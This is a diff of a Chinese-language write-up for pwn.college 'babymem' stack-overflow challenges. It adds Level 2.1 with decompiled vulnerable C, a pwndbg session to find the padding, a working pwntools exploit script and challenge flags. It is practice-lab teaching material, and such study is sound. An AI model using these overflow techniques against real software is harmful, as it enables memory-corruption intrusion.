@@ -23,7 +23,7 @@ description: "Write-ups for pwn.college binary exploitation series."
 
 分析得程序主要逻辑从 `challenge` 函数开始，反编译如下：
 
-```c {9-10} del={55, 63} collapse={3-8, 11-54, 56-62, 64-83, 86-87} ins={84-85}
+```c {9-10} del={55, 63} collapse={1-5, 14-51, 67-80, 59-59} ins={84-85}
 __int64 __fastcall challenge(int a1, __int64 a2, __int64 a3)
 {
   int *v3; // rax
@@ -196,7 +196,7 @@ Flag: `pwn.college{oQdReDoKIU218v6uPGguMuFOJnt.0VO4IDL5cTNxgzW}`
 
 #### Write-up
 
-```c {5-6} del={13} ins={20-21}
+```c {5-6} del={13} ins={20-21} collapse={1-1}
 __int64 challenge()
 {
   int *v0; // rax
@@ -295,7 +295,7 @@ Flag: `pwn.college{cwWgAcBgDsBnGFTCky9i1NRqAtO.0FM5IDL5cTNxgzW}`
 
 #### Write-up
 
-```c {8-12, 22-25, 55} ins={84-85} del={63} collapse={3-7, 13-21, 26-54, 56-62, 64-83, 86-87}
+```c {8-12, 22-25, 55} ins={84-85} del={63} collapse={1-4, 16-18, 29-51, 59-59, 67-80}
 __int64 __fastcall challenge(int a1, __int64 a2, __int64 a3)
 {
   int *v3; // rax
@@ -462,3 +462,234 @@ target.recvall()
 #### Flag
 
 Flag: `pwn.college{w7aHpdU-9AlFvJ5GtohCFtGwF7M.ddTNzMDL5cTNxgzW}`
+
+### Level 2.1
+
+#### Information
+
+- Category: Pwn
+
+#### Description
+
+> Overflow a buffer on the stack to set trickier conditions to obtain the flag!
+
+#### Write-up
+
+```c {5-9, 15-16, 19} ins={28-29} del={21} collapse={1-1}
+__int64 challenge()
+{
+  int *v0; // rax
+  char *v1; // rax
+  size_t nbytes; // [rsp+28h] [rbp-38h] BYREF
+  void *buf; // [rsp+30h] [rbp-30h]
+  _DWORD *v5; // [rsp+38h] [rbp-28h]
+  _QWORD v6[2]; // [rsp+40h] [rbp-20h] BYREF
+  _QWORD v7[2]; // [rsp+50h] [rbp-10h] BYREF
+
+  v7[1] = __readfsqword(0x28u);
+  v6[0] = 0LL;
+  v6[1] = 0LL;
+  v7[0] = 0LL;
+  buf = v6;
+  v5 = (_DWORD *)v7 + 1;
+  nbytes = 0LL;
+  printf("Payload size: ");
+  __isoc99_scanf("%lu", &nbytes);
+  printf("Send your payload (up to %lu bytes)!\n", nbytes);
+  if ( (int)read(0, buf, nbytes) < 0 )
+  {
+    v0 = __errno_location();
+    v1 = strerror(*v0);
+    printf("ERROR: Failed to read input -- %s!\n", v1);
+    exit(1);
+  }
+  if ( *v5 == 758965894 )
+    win();
+  puts("Goodbye!");
+  return 0LL;
+}
+```
+
+令 `v5` 指向的地址处的值为 `758965894` 即可触发 `win`。
+
+最大输入大小可由我们自定义，存在溢出问题。`buf` 的大小为 16 bytes，溢出后可以覆盖 `v7`。
+
+`v5` 为指向 `v7` 的 `_DWORD + 1` 处的地址，所以覆盖 `buf` 后需要加一个 `_DWORD` 才是最终地址。
+
+```asm showLineNumbers=false wrap=false {92-94, 113-114}
+pwndbg> r
+Starting program: /home/cub3y0nd/Projects/pwn.college/babymem-level-2-1
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/usr/lib/libthread_db.so.1".
+###
+### Welcome to /home/cub3y0nd/Projects/pwn.college/babymem-level-2-1!
+###
+
+Payload size: 1771
+Send your payload (up to 1771 bytes)!
+
+Breakpoint 1, 0x000055555555619d in challenge ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+───────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────
+ RAX  0x7fffffffd180 ◂— 0
+ RBX  0x7fffffffe308 —▸ 0x7fffffffe6bb ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-2-1'
+ RCX  0
+ RDX  0x6eb
+ RDI  0
+ RSI  0x7fffffffd180 ◂— 0
+ R8   0x75
+ R9   0xfffffffc
+ R10  0
+ R11  0x202
+ R12  1
+ R13  0
+ R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
+ R15  0
+ RBP  0x7fffffffd1a0 —▸ 0x7fffffffe1e0 —▸ 0x7fffffffe280 —▸ 0x7fffffffe2e0 ◂— 0
+ RSP  0x7fffffffd140 —▸ 0x555555557175 ◂— 0x2023232300232323 /* '###' */
+ RIP  0x55555555619d (challenge+171) ◂— call 0x555555555180
+────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────
+ ► 0x55555555619d <challenge+171>    call   read@plt                    <read@plt>
+        fd: 0 (/dev/pts/0)
+        buf: 0x7fffffffd180 ◂— 0
+        nbytes: 0x6eb
+
+   0x5555555561a2 <challenge+176>    mov    dword ptr [rbp - 0x3c], eax
+   0x5555555561a5 <challenge+179>    cmp    dword ptr [rbp - 0x3c], 0
+   0x5555555561a9 <challenge+183>    jns    challenge+229               <challenge+229>
+
+   0x5555555561ab <challenge+185>    call   __errno_location@plt        <__errno_location@plt>
+
+   0x5555555561b0 <challenge+190>    mov    eax, dword ptr [rax]
+   0x5555555561b2 <challenge+192>    mov    edi, eax
+   0x5555555561b4 <challenge+194>    call   strerror@plt                <strerror@plt>
+
+   0x5555555561b9 <challenge+199>    mov    rsi, rax
+   0x5555555561bc <challenge+202>    lea    rdi, [rip + 0xf85]     RDI => 0x555555557148 ◂— 'ERROR: Failed to read input -- %s!\n'
+   0x5555555561c3 <challenge+209>    mov    eax, 0                 EAX => 0
+─────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7fffffffd140 —▸ 0x555555557175 ◂— 0x2023232300232323 /* '###' */
+01:0008│-058 0x7fffffffd148 —▸ 0x7fffffffe318 —▸ 0x7fffffffe6f1 ◂— 'SHELL=/usr/bin/zsh'
+02:0010│-050 0x7fffffffd150 —▸ 0x7fffffffe308 —▸ 0x7fffffffe6bb ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-2-1'
+03:0018│-048 0x7fffffffd158 ◂— 0x155559020
+04:0020│-040 0x7fffffffd160 —▸ 0x7fffffffd1a0 —▸ 0x7fffffffe1e0 —▸ 0x7fffffffe280 —▸ 0x7fffffffe2e0 ◂— ...
+05:0028│-038 0x7fffffffd168 ◂— 0x6eb
+06:0030│-030 0x7fffffffd170 —▸ 0x7fffffffd180 ◂— 0
+07:0038│-028 0x7fffffffd178 —▸ 0x7fffffffd194 ◂— 0xf7a9ac0000000000
+───────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x55555555619d challenge+171
+   1   0x5555555562ea main+213
+   2   0x7ffff7dcae08
+   3   0x7ffff7dcaecc __libc_start_main+140
+   4   0x55555555520e _start+46
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg> c
+Continuing.
+aaaaaaaabaaaaaaa
+
+Breakpoint 3, 0x00005555555561d7 in challenge ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+───────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────
+*RAX  0x11
+ RBX  0x7fffffffe308 —▸ 0x7fffffffe6bb ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-2-1'
+*RCX  0x7ffff7eb0c21 (read+17) ◂— cmp rax, -0x1000 /* 'H=' */
+ RDX  0x6eb
+ RDI  0
+ RSI  0x7fffffffd180 ◂— 'aaaaaaaabaaaaaaa\n'
+ R8   0x75
+ R9   0xfffffffc
+ R10  0
+*R11  0x246
+ R12  1
+ R13  0
+ R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
+ R15  0
+ RBP  0x7fffffffd1a0 —▸ 0x7fffffffe1e0 —▸ 0x7fffffffe280 —▸ 0x7fffffffe2e0 ◂— 0
+ RSP  0x7fffffffd140 —▸ 0x555555557175 ◂— 0x2023232300232323 /* '###' */
+*RIP  0x5555555561d7 (challenge+229) ◂— mov rax, qword ptr [rbp - 0x28]
+────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────
+ ► 0x5555555561d7 <challenge+229>    mov    rax, qword ptr [rbp - 0x28]     RAX, [0x7fffffffd178] => 0x7fffffffd194 ◂— 0xf7a9ac0000000000
+   0x5555555561db <challenge+233>    mov    eax, dword ptr [rax]            EAX, [0x7fffffffd194] => 0
+   0x5555555561dd <challenge+235>    cmp    eax, 0x2d3ce686                 0x0 - 0x2d3ce686     EFLAGS => 0x293 [ CF pf AF zf SF IF df of ]
+   0x5555555561e2 <challenge+240>  ✔ jne    challenge+252               <challenge+252>
+    ↓
+   0x5555555561ee <challenge+252>    lea    rdi, [rip + 0xf77]              RDI => 0x55555555716c ◂— 'Goodbye!'
+   0x5555555561f5 <challenge+259>    call   puts@plt                    <puts@plt>
+
+   0x5555555561fa <challenge+264>    mov    eax, 0                       EAX => 0
+   0x5555555561ff <challenge+269>    mov    rcx, qword ptr [rbp - 8]
+   0x555555556203 <challenge+273>    xor    rcx, qword ptr fs:[0x28]
+   0x55555555620c <challenge+282>    je     challenge+289               <challenge+289>
+
+   0x55555555620e <challenge+284>    call   __stack_chk_fail@plt        <__stack_chk_fail@plt>
+─────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7fffffffd140 —▸ 0x555555557175 ◂— 0x2023232300232323 /* '###' */
+01:0008│-058 0x7fffffffd148 —▸ 0x7fffffffe318 —▸ 0x7fffffffe6f1 ◂— 'SHELL=/usr/bin/zsh'
+02:0010│-050 0x7fffffffd150 —▸ 0x7fffffffe308 —▸ 0x7fffffffe6bb ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-2-1'
+03:0018│-048 0x7fffffffd158 ◂— 0x155559020
+04:0020│-040 0x7fffffffd160 ◂— 0x11ffffd1a0
+05:0028│-038 0x7fffffffd168 ◂— 0x6eb
+06:0030│-030 0x7fffffffd170 —▸ 0x7fffffffd180 ◂— 'aaaaaaaabaaaaaaa\n'
+07:0038│-028 0x7fffffffd178 —▸ 0x7fffffffd194 ◂— 0xf7a9ac0000000000
+───────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x5555555561d7 challenge+229
+   1   0x5555555562ea main+213
+   2   0x7ffff7dcae08
+   3   0x7ffff7dcaecc __libc_start_main+140
+   4   0x55555555520e _start+46
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg> x/wx $rbp-0x28
+0x7fffffffd178: 0xffffd194
+pwndbg> p/x 0x194-0x180
+$4 = 0x14
+```
+
+算出来 padding 大小是 `0x14`。
+
+#### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import context, ELF, process, remote, gdb, p64
+
+context(os="linux", arch="amd64", log_level="debug", terminal="kitty")
+
+FILE = "./babymem-level-2-1"
+HOST = "pwn.college"
+PORT = 1337
+
+gdbscript = """
+c
+"""
+
+
+def launch(local=True, debug=False):
+    if local:
+        elf = ELF(FILE)
+        context.binary = elf
+
+        if debug:
+            return gdb.debug([elf.path], gdbscript=gdbscript)
+        else:
+            return process([elf.path])
+    else:
+        return remote(HOST, PORT)
+
+
+target = launch()
+
+payload = b"".ljust(0x14, b"A") + p64(758965894)
+payload_size = str(len(payload)).encode()
+
+target.recvuntil(b"Payload size: ")
+target.sendline(payload_size)
+target.recvuntil(b"Send your payload")
+target.send(payload)
+
+target.recvall()
+```
+
+#### Flag
+
+Flag: `pwn.college{sZCPUpjO4U6HmvntMr91HLyNljf.dhTNzMDL5cTNxgzW}`
